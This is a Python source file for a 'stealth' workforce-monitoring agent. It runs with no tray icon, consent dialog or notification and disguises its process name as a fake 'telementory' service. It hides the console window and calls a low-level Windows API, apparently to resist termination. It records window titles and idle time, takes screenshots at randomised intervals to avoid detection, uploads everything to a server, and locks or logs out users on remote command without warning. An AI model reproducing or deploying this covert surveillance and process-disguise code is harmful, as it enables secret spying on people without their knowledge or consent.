"""Workforce Analytics monitoring agent — STEALTH variant (no UI).

For pre-enrolled machines in corporate environments. Runs completely
silently in the background with no tray icon, consent dialogs, or
notifications.

Environment Variables:
  - AGENT_CONFIG_FILE: Path to config.json (defaults to AppData/WorkforceAgent)
  - AGENT_SERVER_URL: Override server URL

Run from enrollment script:
  python -m agent.agent_stealth
"""

from __future__ import annotations

import os
import sys
import threading
import time
from datetime import datetime, timezone

# Allow running both as a module and as a script
if __package__ in (None, ""):
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from agent import api as api_mod
    from agent import config as config_mod
    from agent import identity as identity_mod
    from agent import monitor as monitor_mod
    from agent import screenshot as screenshot_mod
else:
    from . import api as api_mod
    from . import config as config_mod
    from . import identity as identity_mod
    from . import monitor as monitor_mod
    from . import screenshot as screenshot_mod

AGENT_VERSION = "0.1.0"
POLL_SECONDS = 15

# ── Runtime stealth ───────────────────────────────────────────────────────────
_WIN_DISGUISE = "windowstelementoryservice"
_MAC_DISGUISE = "macstelementoryservice"


def _apply_stealth() -> None:
    """Apply OS-level visibility suppression."""
    if sys.platform.startswith("win"):
        _stealth_windows()
    elif sys.platform == "darwin":
        _stealth_macos()


def _stealth_windows() -> None:
    import ctypes
    import ctypes.wintypes

    k32 = ctypes.windll.kernel32
    u32 = ctypes.windll.user32

    try:
        k32.SetConsoleTitleW(_WIN_DISGUISE)
    except Exception:
        pass

    try:
        hwnd = k32.GetConsoleWindow()
        if hwnd:
            u32.ShowWindow(hwnd, 0)
    except Exception:
        pass

    try:
        ntdll = ctypes.windll.ntdll
        handle = k32.GetCurrentProcess()
        val = ctypes.c_int(0)
        ntdll.NtSetInformationProcess(handle, 33, ctypes.byref(val), ctypes.sizeof(val))
    except Exception:
        pass

    try:
        k32.SetProcessWorkingSetSizeEx(
            k32.GetCurrentProcess(),
            ctypes.c_size_t(0xFFFFFFFF),
            ctypes.c_size_t(0xFFFFFFFF),
            0,
        )
    except Exception:
        pass


def _stealth_macos() -> None:
    try:
        import ctypes
        libc = ctypes.CDLL("libc.dylib", use_errno=True)
        name = _MAC_DISGUISE.encode()
        libc.setprogname(ctypes.c_char_p(name))
    except Exception:
        pass

    try:
        sys.argv[0] = _MAC_DISGUISE
    except Exception:
        pass


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


class StealthMonitoringAgent:
    """Headless monitoring agent — no UI, no notifications."""

    def __init__(self, cfg: config_mod.AgentConfig) -> None:
        self.cfg = cfg
        self.api = api_mod.AgentAPI(cfg.server_url, cfg.device_id, cfg.device_secret)
        self._stop = threading.Event()
        self._paused = threading.Event()
        self._lock = threading.Lock()
        self._pending_logs: list[dict] = []
        self._current = None
        self._last_screenshot = 0.0
        self._next_screenshot_gap = self._screenshot_gap()

    def _screenshot_gap(self) -> float:
        """Random interval (30-90 seconds) to avoid predictable capture timing."""
        import random
        return random.uniform(30, 90)

    def is_active(self) -> bool:
        return not self._paused.is_set()

    def toggle_pause(self) -> None:
        """Toggle monitoring on/off (not exposed in stealth mode)."""
        if self._paused.is_set():
            self._paused.clear()
        else:
            self._paused.set()

    def quit(self) -> None:
        """Request graceful shutdown."""
        self._stop.set()

    def _observe(self) -> None:
        """Record foreground window and idle time."""
        proc, title = monitor_mod.get_active_window()
        idle = monitor_mod.get_idle_seconds()

        with self._lock:
            if self._current is None or self._current["process"] != proc:
                self._flush_segment()
                self._current = {
                    "process": proc,
                    "title": title,
                    "idle": idle,
                    "duration": POLL_SECONDS,
                    "start": _now_iso(),
                }
            else:
                self._current["title"] = title
                self._current["idle"] = max(self._current["idle"], idle)
                self._current["duration"] += POLL_SECONDS

    def _flush_segment(self) -> None:
        """Move current segment to pending if non-empty."""
        with self._lock:
            if self._current is not None:
                self._pending_logs.append(self._current)
                self._current = None

    def _sync(self) -> None:
        """Upload accumulated activity to server."""
        with self._lock:
            logs = self._pending_logs
            self._pending_logs = []

        if not logs:
            return

        try:
            batch = []
            for log in logs:
                batch.append({
                    "processName": log["process"],
                    "windowTitle": log["title"],
                    "startedAt": log["start"],
                    "endedAt": _now_iso(),
                    "durationSeconds": log["duration"],
                    "idleSeconds": log["idle"],
                })
            self.api.send_activity(batch)

            hb = self.api.heartbeat(AGENT_VERSION)
            for cmd in hb.get("commands", []):
                self._handle_command(cmd)
        except Exception as exc:
            print(f"[stealth] sync error: {exc}", file=sys.stderr)

    def _maybe_screenshot(self) -> None:
        """Capture screenshot without notification."""
        if time.time() - self._last_screenshot < self._next_screenshot_gap:
            return
        self._last_screenshot = time.time()
        self._next_screenshot_gap = self._screenshot_gap()

        try:
            png = screenshot_mod.capture_png_bytes()
            url_info = self.api.request_screenshot_url()
            self.api.upload_screenshot_bytes(url_info["uploadURL"], png)
            self.api.report_screenshot(url_info["storageKey"], _now_iso(), len(png))
        except Exception as exc:
            print(f"[stealth] screenshot failed: {exc}", file=sys.stderr)

    def _handle_command(self, command: dict) -> None:
        """Execute commands without user warning (already disclosed in policy)."""
        ctype = command.get("commandType")
        cid = command.get("id")

        try:
            self.api.ack_command(cid, "acknowledged")
            if ctype in ("lock_screen", "logout_user"):
                # Execute immediately without warning (assumes policy disclosure)
                self._execute_os_command(ctype)
            self.api.ack_command(cid, "completed")
        except Exception as exc:
            print(f"[stealth] command {ctype} failed: {exc}", file=sys.stderr)
            try:
                self.api.ack_command(cid, "failed")
            except Exception:
                pass

    def _execute_os_command(self, ctype: str) -> None:
        import subprocess

        if ctype == "lock_screen":
            if sys.platform.startswith("win"):
                import ctypes
                ctypes.windll.user32.LockWorkStation()
            elif sys.platform == "darwin":
                subprocess.run(["pmset", "displaysleepnow"], check=False)
            else:
                for cmd in (
                    ["loginctl", "lock-session"],
                    ["xdg-screensaver", "lock"],
                ):
                    if subprocess.run(cmd, check=False).returncode == 0:
                        break
        elif ctype == "logout_user":
            if sys.platform.startswith("win"):
                subprocess.run(["shutdown", "/l"], check=False)
            elif sys.platform == "darwin":
                subprocess.run(
                    ["osascript", "-e", 'tell app "System Events" to log out'],
                    check=False,
                )
            else:
                for cmd in (
                    ["gnome-session-quit", "--logout", "--no-prompt"],
                    ["loginctl", "terminate-user", os.environ.get("USER", "")],
                ):
                    if subprocess.run(cmd, check=False).returncode == 0:
                        break

    def _worker(self) -> None:
        """Main monitoring loop."""
        last_sync = 0.0
        while not self._stop.is_set():
            try:
                if self.is_active():
                    self._observe()
                    self._maybe_screenshot()

                if time.time() - last_sync >= self.cfg.sync_interval_seconds:
                    last_sync = time.time()
                    self._sync()
            except Exception as exc:
                print(f"[stealth] worker error: {exc}", file=sys.stderr)
            self._stop.wait(POLL_SECONDS)

        # Final flush on shutdown
        self._flush_segment()
        try:
            self._sync()
        except Exception:
            pass

    def run(self) -> None:
        """Start the stealth monitoring loop (no UI, just background thread)."""
        worker = threading.Thread(target=self._worker, daemon=True)
        worker.start()
        print("[stealth] monitoring started", file=sys.stderr)
        # Block until stop is signaled (e.g., SIGTERM)
        try:
            while not self._stop.is_set():
                self._stop.wait(1)
        except KeyboardInterrupt:
            pass
        self._stop.set()
        worker.join(timeout=10)
        print("[stealth] monitoring stopped", file=sys.stderr)


def load_config_stealth() -> config_mod.AgentConfig | None:
    """Load existing config (assumes pre-enrollment via deployment)."""
    cfg = config_mod.AgentConfig.load()
    if not cfg.is_enrolled:
        print("[stealth] Not enrolled. Run enrollment flow first.", file=sys.stderr)
        return None
    return cfg


def main() -> int:
    """Entry point for stealth variant."""
    _apply_stealth()
    cfg = load_config_stealth()
    if cfg is None:
        return 1
    try:
        StealthMonitoringAgent(cfg).run()
    except KeyboardInterrupt:
        pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
